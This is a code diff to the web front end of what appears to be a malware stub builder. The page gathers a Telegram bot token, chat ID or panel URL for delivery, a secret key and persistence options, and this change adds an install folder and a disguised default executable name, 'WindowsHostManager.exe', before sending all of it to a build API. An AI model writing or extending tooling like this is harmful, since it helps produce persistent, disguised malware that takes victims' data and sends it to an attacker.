@@ -1387,6 +1387,9 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
     const persistMethods = Array.from(persistChecks).map(c => c.value).filter(v => v !== 'none');
     const persistence = document.getElementById('persist-none').checked ? 'none' : persistMethods.join(',') || 'none';
 
+    const installFolder = document.getElementById('build-install-folder').value;
+    const installName   = document.getElementById('build-install-name').value.trim() || 'WindowsHostManager.exe';
+
     // Validation
     if (delivery === 'TELEGRAM') {
         if (!botToken || !chatId) {
@@ -1394,17 +1397,22 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
             return;
         }
     }
+    if (installName.length > 31) {
+        log('Error: Install filename exceeds 31 characters!', 'error');
+        return;
+    }
 
     log('Initializing compilation payload...', 'info');
     log(`Delivery target selected: ${delivery}`, 'warning');
     log(`Persistence: ${persistence}`, 'info');
+    log(`Install location: ${installFolder}\\${installName}`, 'info');
     log('Contacting Python builder engine API...', 'info');
 
     try {
         const res = await fetch('/api/build', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence })
+            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence, installFolder, installName })
         });
 
         const data = await res.json();
